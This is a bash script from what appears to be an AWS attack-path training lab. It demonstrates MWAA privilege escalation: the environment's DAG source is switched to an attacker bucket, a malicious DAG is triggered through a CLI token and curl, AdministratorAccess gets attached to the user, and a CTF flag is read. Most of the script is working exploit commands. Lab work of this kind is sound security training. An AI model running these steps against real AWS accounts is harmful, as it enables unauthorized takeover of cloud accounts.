#!/bin/bash

# Demo script for airflow:UpdateEnvironment privilege escalation (mwaa-002)
# This script demonstrates how a user with airflow:UpdateEnvironment permission
# can escalate to admin by changing an MWAA environment's DAG source to an
# attacker-controlled bucket containing a malicious DAG that attaches
# AdministratorAccess to the starting user when triggered


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-mwaa-002-to-admin-starting-user"
ADMIN_ROLE="pl-prod-mwaa-002-to-admin-admin-role"
MWAA_ENVIRONMENT="pl-prod-mwaa-002-to-admin-env"

echo ""
echo -e "${RED}========================================${NC}"
echo -e "${RED}          COST & TIME WARNING          ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "${RED}This demo updates an existing Amazon MWAA environment.${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}Key information:${NC}"
echo -e "${RED}  - MWAA Environment Cost: ~\$37/month (already running)${NC}"
echo -e "${RED}  - Update Time: 10-30 minutes for changes to take effect${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}After the demo, run cleanup_attack.sh to restore the original${NC}"
echo -e "${RED}DAG source and detach the AdministratorAccess policy.${NC}"
echo -e "${RED}========================================${NC}"
echo ""
echo -e "${YELLOW}Press Enter to continue or Ctrl+C to cancel...${NC}"
read -r

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}MWAA UpdateEnvironment Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_mwaa_002_airflow_updateenvironment.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract infrastructure details
MWAA_ENV_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.mwaa_environment_name')
ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
ATTACKER_DAG_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_dag_path')
MALICIOUS_DAG_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.malicious_dag_name')
ORIGINAL_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.original_bucket_name')
ORIGINAL_DAG_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.original_dag_path')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
STARTING_USER_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_arn')

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_NAME"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "MWAA Environment: $MWAA_ENV_NAME"
echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
echo "Attacker DAG Path: $ATTACKER_DAG_PATH"
echo "Malicious DAG Name: $MALICIOUS_DAG_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_user_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_user_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION]
# Step 4: Verify lack of admin permissions
use_readonly_creds
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Checking currently attached policies to starting user..."

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyName' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER_NAME" \
    --query 'AttachedPolicies[*].PolicyName' \
    --output text 2>/dev/null || echo "")

if [ -n "$ATTACHED_POLICIES" ]; then
    echo "Currently attached policies: $ATTACHED_POLICIES"
else
    echo "No managed policies currently attached to user"
fi

echo ""
echo "Attempting to list IAM users (should fail)..."
use_starting_user_creds
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION]
# Step 5: Check current MWAA environment status
use_readonly_creds
echo -e "${YELLOW}Step 5: Checking current MWAA environment status${NC}"
echo "Environment: $MWAA_ENV_NAME"
echo ""

show_cmd "ReadOnly" "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --output json"
ENV_INFO=$(aws mwaa get-environment \
    --region "$AWS_REGION" \
    --name "$MWAA_ENV_NAME" \
    --output json 2>/dev/null)

CURRENT_STATUS=$(echo "$ENV_INFO" | jq -r '.Environment.Status')
CURRENT_DAG_PATH=$(echo "$ENV_INFO" | jq -r '.Environment.DagS3Path // "dags/"')
CURRENT_SOURCE_BUCKET=$(echo "$ENV_INFO" | jq -r '.Environment.SourceBucketArn')

echo "Current Status: $CURRENT_STATUS"
echo "Current Source Bucket: $CURRENT_SOURCE_BUCKET"
echo "Current DAG Path: $CURRENT_DAG_PATH"

if [ "$CURRENT_STATUS" != "AVAILABLE" ]; then
    echo -e "${RED}Error: MWAA environment is not in AVAILABLE state (current: $CURRENT_STATUS)${NC}"
    echo "Please wait for the environment to be available before running this demo."
    exit 1
fi
echo -e "${GREEN}✓ Environment is AVAILABLE${NC}\n"

# [EXPLOIT]
# Step 6: Update MWAA environment with attacker's DAG bucket
use_starting_user_creds
echo -e "${YELLOW}Step 6: Updating MWAA environment with attacker's DAG bucket${NC}"
echo -e "${MAGENTA}This is the privilege escalation vector!${NC}"
echo ""
echo "The attacker-controlled bucket contains a malicious DAG that will:"
echo "  1. Execute with the admin execution role credentials"
echo "  2. Attach AdministratorAccess policy to $STARTING_USER_NAME"
echo ""
echo -e "${BLUE}Attacker Bucket: s3://$ATTACKER_BUCKET_NAME${NC}"
echo -e "${BLUE}Malicious DAG Path: $ATTACKER_DAG_PATH${NC}"
echo -e "${BLUE}Malicious DAG Name: $MALICIOUS_DAG_NAME${NC}"
echo ""

echo "Calling airflow:UpdateEnvironment to change DAG source..."

show_attack_cmd "Attacker" "aws mwaa update-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --source-bucket-arn \"arn:aws:s3:::$ATTACKER_BUCKET_NAME\" --dag-s3-path \"$ATTACKER_DAG_PATH\""
aws mwaa update-environment \
    --region "$AWS_REGION" \
    --name "$MWAA_ENV_NAME" \
    --source-bucket-arn "arn:aws:s3:::$ATTACKER_BUCKET_NAME" \
    --dag-s3-path "$ATTACKER_DAG_PATH" > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully initiated MWAA environment update!${NC}"
else
    echo -e "${RED}Error: Failed to update MWAA environment${NC}"
    exit 1
fi
echo ""

# [OBSERVATION]
# Step 7: Wait for MWAA environment to update
use_readonly_creds
echo -e "${YELLOW}Step 7: Waiting for MWAA environment to update${NC}"
echo -e "${BLUE}This typically takes 10-30 minutes. Please be patient...${NC}"
echo ""
echo "The environment will reload DAGs from the new bucket."
echo ""

MAX_WAIT=2400  # 40 minutes maximum
ELAPSED=0
CHECK_INTERVAL=60  # Check every minute

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --query 'Environment.Status' --output text"
    STATUS=$(aws mwaa get-environment \
        --region "$AWS_REGION" \
        --name "$MWAA_ENV_NAME" \
        --query 'Environment.Status' \
        --output text 2>/dev/null)

    MINUTES=$((ELAPSED / 60))
    echo "  [${MINUTES}m] Environment status: $STATUS"

    if [ "$STATUS" = "AVAILABLE" ] && [ $ELAPSED -gt 0 ]; then
        # Check if the source bucket was actually updated
        UPDATED_BUCKET=$(aws mwaa get-environment \
            --region "$AWS_REGION" \
            --name "$MWAA_ENV_NAME" \
            --query 'Environment.SourceBucketArn' \
            --output text 2>/dev/null)

        if [[ "$UPDATED_BUCKET" == *"$ATTACKER_BUCKET_NAME"* ]]; then
            echo ""
            echo -e "${GREEN}✓ MWAA environment update complete!${NC}"
            echo "New source bucket: $UPDATED_BUCKET"
            break
        fi
    elif [ "$STATUS" = "UPDATE_FAILED" ]; then
        echo ""
        echo -e "${RED}✗ MWAA environment update failed!${NC}"
        echo "Fetching error details..."
        aws mwaa get-environment \
            --region "$AWS_REGION" \
            --name "$MWAA_ENV_NAME" \
            --query 'Environment.LastUpdate' \
            --output json
        echo ""
        echo -e "${RED}Please run cleanup_attack.sh to restore the environment${NC}"
        exit 1
    fi

    sleep $CHECK_INTERVAL
    ELAPSED=$((ELAPSED + CHECK_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}✗ Timeout: Environment did not become available within expected time${NC}"
    echo -e "${RED}The update may still be in progress. Check the AWS console.${NC}"
    echo -e "${RED}Please run cleanup_attack.sh to clean up if needed${NC}"
    exit 1
fi
echo ""

# Step 8: Wait for DAGs to sync
echo -e "${YELLOW}Step 8: Waiting for DAGs to sync (60 seconds)${NC}"
echo "MWAA needs time to discover and parse the new DAGs from the attacker bucket..."
sleep 60
echo -e "${GREEN}✓ DAG sync wait complete${NC}\n"

# [EXPLOIT]
# Step 9: Trigger the malicious DAG
use_starting_user_creds
echo -e "${YELLOW}Step 9: Triggering the malicious DAG${NC}"
echo -e "${MAGENTA}Using airflow:CreateCliToken to access Airflow API...${NC}"
echo ""

CLI_TOKEN_RESPONSE=$(aws mwaa create-cli-token \
    --region "$AWS_REGION" \
    --name "$MWAA_ENV_NAME" \
    --output json 2>/dev/null)

WEB_SERVER_HOSTNAME=$(echo "$CLI_TOKEN_RESPONSE" | jq -r '.WebServerHostname')
CLI_TOKEN=$(echo "$CLI_TOKEN_RESPONSE" | jq -r '.CliToken')

echo "Web Server Hostname: $WEB_SERVER_HOSTNAME"
echo ""

echo -e "${BLUE}Triggering DAG: $MALICIOUS_DAG_NAME${NC}"
echo ""

# Trigger the DAG using Airflow CLI via MWAA API
TRIGGER_RESPONSE=$(curl -s --request POST \
    "https://${WEB_SERVER_HOSTNAME}/aws_mwaa/cli" \
    --header "Authorization: Bearer ${CLI_TOKEN}" \
    --header "Content-Type: text/plain" \
    --data-raw "dags trigger ${MALICIOUS_DAG_NAME}" | base64 -d 2>/dev/null || echo "Trigger request sent")

echo "Response: $TRIGGER_RESPONSE"
echo ""

if [[ "$TRIGGER_RESPONSE" == *"error"* ]] || [[ "$TRIGGER_RESPONSE" == *"not found"* ]]; then
    echo -e "${YELLOW}Note: DAG may need more time to be discovered. Waiting 30 more seconds...${NC}"
    sleep 30

    # Try again
    CLI_TOKEN_RESPONSE=$(aws mwaa create-cli-token \
        --region "$AWS_REGION" \
        --name "$MWAA_ENV_NAME" \
        --output json 2>/dev/null)
    CLI_TOKEN=$(echo "$CLI_TOKEN_RESPONSE" | jq -r '.CliToken')

    TRIGGER_RESPONSE=$(curl -s --request POST \
        "https://${WEB_SERVER_HOSTNAME}/aws_mwaa/cli" \
        --header "Authorization: Bearer ${CLI_TOKEN}" \
        --header "Content-Type: text/plain" \
        --data-raw "dags trigger ${MALICIOUS_DAG_NAME}" | base64 -d 2>/dev/null || echo "Trigger request sent")

    echo "Retry response: $TRIGGER_RESPONSE"
fi

echo -e "${GREEN}✓ DAG trigger request sent${NC}\n"

# Step 10: Wait for DAG execution and IAM propagation
echo -e "${YELLOW}Step 10: Waiting for DAG execution and IAM policy propagation${NC}"
echo "The DAG runs with admin execution role credentials and attaches AdministratorAccess..."
echo "Waiting 30 seconds for DAG execution and IAM changes to propagate..."
sleep 30
echo -e "${GREEN}✓ Wait complete${NC}\n"

# [OBSERVATION]
# Step 11: Verify admin access
use_readonly_creds
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Checking if AdministratorAccess is now attached to starting user..."

# Check attached policies
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER_NAME" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null || echo "")

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER_NAME!${NC}"
else
    echo -e "${YELLOW}Note: AdministratorAccess not yet visible. Checking again after waiting...${NC}"
    sleep 15

    ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER_NAME" \
        --query 'AttachedPolicies[*].PolicyArn' \
        --output text 2>/dev/null || echo "")

    if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER_NAME!${NC}"
    fi
fi

echo ""
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${YELLOW}Note: May need to wait longer for IAM propagation${NC}"
    echo "The DAG should have attached AdministratorAccess to $STARTING_USER_NAME"
fi
echo ""

# [EXPLOIT] Step 12: Capture the CTF flag
# AdministratorAccess is now attached to the starting user; switch back to those
# elevated credentials and read the flag from SSM Parameter Store.
use_starting_user_creds
echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/mwaa-002-to-admin"
show_attack_cmd "Attacker (elevated)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_NAME (limited permissions)"
echo "2. Updated existing MWAA environment: $MWAA_ENV_NAME"
echo "3. Changed DAG source to attacker-controlled bucket"
echo "4. Triggered malicious DAG using airflow:CreateCliToken"
echo "5. DAG executed with admin execution role credentials"
echo "6. DAG attached AdministratorAccess to starting user"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER_NAME → (airflow:UpdateEnvironment)"
echo -e "  → Changed DAG source to attacker's bucket"
echo -e "  → (airflow:CreateCliToken) → Triggered malicious DAG"
echo -e "  → (DAG execution with $ADMIN_ROLE credentials)"
echo -e "  → (iam:AttachUserPolicy) → Admin Access"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Key Difference from mwaa-001:${NC}"
echo "  - mwaa-001: Creates a NEW environment with PassRole"
echo "  - mwaa-002: Updates an EXISTING environment (no PassRole needed!)"
echo "  - mwaa-002: No ec2:CreateNetworkInterface or ec2:CreateVpcEndpoint needed!"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified DAG Source on: $MWAA_ENV_NAME"
echo "- Policy Attachment: AdministratorAccess on $STARTING_USER_NAME"

echo ""
echo -e "${RED}========================================${NC}"
echo -e "${RED}          CLEANUP REQUIRED             ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "${RED}Run the cleanup script to:${NC}"
echo -e "${RED}  1. Restore the original DAG source bucket${NC}"
echo -e "${RED}  2. Detach AdministratorAccess from the starting user${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}  ./cleanup_attack.sh${NC}"
echo -e "${RED}${NC}"
echo -e "${RED}Note: Cleanup will also require an environment update (~10-30 min)${NC}"
echo -e "${RED}========================================${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
